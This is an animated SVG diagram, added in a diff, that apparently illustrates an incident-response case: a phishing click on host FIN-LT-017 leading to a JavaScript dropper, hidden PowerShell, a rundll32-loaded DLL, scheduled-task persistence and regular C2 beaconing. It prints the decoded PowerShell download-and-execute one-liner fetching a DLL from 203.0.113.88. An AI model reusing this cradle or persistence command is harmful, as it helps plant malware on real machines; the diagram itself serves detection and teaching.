@@ -1,0 +1,107 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 640" width="1200" height="640" role="img" aria-label="Process tree on FIN-LT-017. Outlook opened the phishing link in Edge, which downloaded INV-88412_Secure.zip. Explorer launched wscript.exe on INV-88412.js, which started hidden encoded PowerShell. PowerShell downloaded WinUpdate.dll over HTTP from 203.0.113.88, ran it with rundll32 and created the OneDriveSyncHelper scheduled task. rundll32 then beaconed to 203.0.113.88 on 443 fifty-eight times, about every 303 seconds.">
+  <title>FIN-LT-017: from a click to a heartbeat</title>
+  <defs>
+    <pattern id="grid" width="32" height="32" patternUnits="userSpaceOnUse"><path d="M32 0H0V32" fill="none" stroke="#1e293b" stroke-width="1"/></pattern>
+    <clipPath id="ecg"><rect x="836" y="226" width="290" height="120"/></clipPath>
+  </defs>
+  <style>
+    .sans { font-family: "Segoe UI", Inter, system-ui, -apple-system, Roboto, sans-serif; }
+    .mono { font-family: "Cascadia Mono", Consolas, "SFMono-Regular", Menlo, monospace; font-variant-ligatures: none; }
+    .s { animation: s 12s ease-out infinite both; }
+    .s1 { animation-delay: .2s; } .s2 { animation-delay: .9s; } .s3 { animation-delay: 1.6s; } .s4 { animation-delay: 2.3s; }
+    .s5 { animation-delay: 3s; } .s6 { animation-delay: 3.7s; } .s7 { animation-delay: 4.4s; } .s8 { animation-delay: 5.1s; }
+    @keyframes s { 0% { opacity: 0; transform: translateX(-10px); } 5%, 92% { opacity: 1; transform: none; } 100% { opacity: 0; } }
+    .wave { animation: wave 3s linear infinite; }
+    @keyframes wave { from { transform: translateX(0); } to { transform: translateX(-100px); } }
+    .blink { animation: blink 1.5s ease-in-out infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: .25; } }
+    @media (prefers-reduced-motion: reduce) { * { animation: none !important; } }
+  </style>
+
+  <rect width="1200" height="640" rx="22" fill="#0b1220"/>
+  <rect width="1200" height="640" rx="22" fill="url(#grid)" opacity=".55"/>
+  <text x="48" y="58" class="sans" font-size="15" font-weight="700" letter-spacing="3" fill="#fb7185">STEP 5 · ENDPOINT</text>
+  <text x="48" y="96" class="sans" font-size="30" font-weight="700" fill="#f8fafc">FIN-LT-017: from one click to a heartbeat</text>
+
+  <!-- connectors -->
+  <g fill="none" stroke="#475569" stroke-width="2">
+    <path d="M190 160 H 236"/>
+    <path d="M566 160 H 592"/>
+    <path d="M190 250 H 236"/>
+    <path d="M276 272 V 330 H 300"/>
+    <path d="M330 352 V 410 H 344"/>
+    <path d="M330 410 V 470 H 344"/>
+    <path d="M330 470 V 530 H 344"/>
+  </g>
+
+  <g class="mono" font-size="14">
+    <g class="s s1">
+      <rect x="48" y="138" width="142" height="44" rx="9" fill="#111a2c" stroke="#475569"/>
+      <text x="62" y="165" fill="#cbd5e1">OUTLOOK.EXE</text>
+    </g>
+    <g class="s s2">
+      <rect x="236" y="138" width="330" height="44" rx="9" fill="#111a2c" stroke="#60a5fa"/>
+      <text x="250" y="165" fill="#e2e8f0">msedge.exe <tspan fill="#93c5fd">opens link</tspan></text>
+      <text x="556" y="165" text-anchor="end" fill="#64748b">09:31:09</text>
+    </g>
+    <g class="s s3">
+      <rect x="592" y="138" width="214" height="44" rx="9" fill="#1c1408" stroke="#f59e0b"/>
+      <text x="606" y="165" fill="#fde68a">↓ INV-88412_Secure.zip</text>
+    </g>
+    <g class="s s1">
+      <rect x="48" y="228" width="142" height="44" rx="9" fill="#111a2c" stroke="#475569"/>
+      <text x="62" y="255" fill="#cbd5e1">explorer.exe</text>
+    </g>
+    <g class="s s4">
+      <rect x="236" y="228" width="556" height="44" rx="9" fill="#2a0a14" stroke="#fb7185"/>
+      <text x="250" y="255" fill="#fecdd3">wscript.exe <tspan fill="#fda4af">…\Temp1_INV-88412_Secure.zip\INV-88412.js</tspan></text>
+      <text x="782" y="255" text-anchor="end" fill="#94a3b8">09:33:12</text>
+    </g>
+    <g class="s s5">
+      <rect x="300" y="308" width="492" height="44" rx="9" fill="#2a0a14" stroke="#fb7185"/>
+      <text x="314" y="335" fill="#fecdd3">powershell.exe <tspan fill="#fda4af">-nop -w hidden -enc JAB1AD0A…</tspan></text>
+      <text x="782" y="335" text-anchor="end" fill="#94a3b8">09:33:15</text>
+    </g>
+    <g class="s s6">
+      <rect x="344" y="388" width="448" height="44" rx="9" fill="#1c1408" stroke="#f59e0b"/>
+      <text x="358" y="415" fill="#fde68a">GET http://203.0.113.88/d/WinUpdate.dll</text>
+      <text x="782" y="415" text-anchor="end" fill="#94a3b8">09:33:16</text>
+    </g>
+    <g class="s s7">
+      <rect x="344" y="448" width="448" height="44" rx="9" fill="#2a0a14" stroke="#f43f5e" stroke-width="2"/>
+      <text x="358" y="475" fill="#fecdd3">rundll32.exe <tspan fill="#fda4af">%APPDATA%\WinUpdate.dll,Start</tspan></text>
+      <text x="782" y="475" text-anchor="end" fill="#94a3b8">09:33:21</text>
+    </g>
+    <g class="s s8">
+      <rect x="344" y="508" width="448" height="44" rx="9" fill="#2a0a14" stroke="#fb7185"/>
+      <text x="358" y="535" fill="#fecdd3">schtasks <tspan fill="#fda4af">/sc onlogon "OneDriveSyncHelper"</tspan></text>
+      <text x="782" y="535" text-anchor="end" fill="#94a3b8">09:33:40</text>
+    </g>
+  </g>
+
+  <!-- heartbeat -->
+  <g class="sans">
+    <rect x="820" y="138" width="330" height="414" rx="14" fill="#140a10" stroke="#f43f5e" stroke-width="2"/>
+    <circle cx="848" cy="168" r="7" fill="#f43f5e" class="blink"/>
+    <text x="864" y="174" font-size="13" font-weight="700" letter-spacing="2" fill="#fda4af">LIVE C2 BEACON</text>
+    <text x="840" y="206" class="mono" font-size="14" fill="#fecdd3">rundll32.exe → 203.0.113.88:443</text>
+    <line x1="836" y1="286" x2="1126" y2="286" stroke="#3f1d2b" stroke-width="1"/>
+    <g clip-path="url(#ecg)">
+      <path class="wave" fill="none" stroke="#f43f5e" stroke-width="2.5" stroke-linejoin="round"
+        d="M836 286 H 880 l 8 -44 l 10 80 l 8 -36 H 980 l 8 -44 l 10 80 l 8 -36 H 1080 l 8 -44 l 10 80 l 8 -36 H 1180 l 8 -44 l 10 80 l 8 -36 H 1280"/>
+    </g>
+    <g font-size="15" fill="#e2e8f0">
+      <text x="840" y="378"><tspan class="mono" font-size="22" font-weight="700" fill="#fb7185">58</tspan>  connections</text>
+      <text x="840" y="414"><tspan class="mono" font-size="22" font-weight="700" fill="#fb7185">303 s</tspan>  median gap (±2 s)</text>
+      <text x="840" y="450"><tspan class="mono" font-weight="700" fill="#fecdd3">09:33:25 → 14:21:35</tspan></text>
+    </g>
+    <text font-size="14" fill="#fda4af">
+      <tspan x="840" y="496">Regular cadence with tiny jitter is a</tspan>
+      <tspan x="840" y="518">machine, not a person. Isolate first,</tspan>
+      <tspan x="840" y="540">investigate second.</tspan>
+    </text>
+  </g>
+
+  <text x="48" y="586" class="sans" font-size="13" font-weight="700" letter-spacing="2" fill="#94a3b8">THE -ENC BLOB, DECODED (UTF-16LE)</text>
+  <text x="48" y="612" class="mono" font-size="12" fill="#cbd5e1">$u='http://203.0.113.88/d/WinUpdate.dll';$o="$env:APPDATA\WinUpdate.dll";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process rundll32.exe "$o,Start"</text>
+</svg>
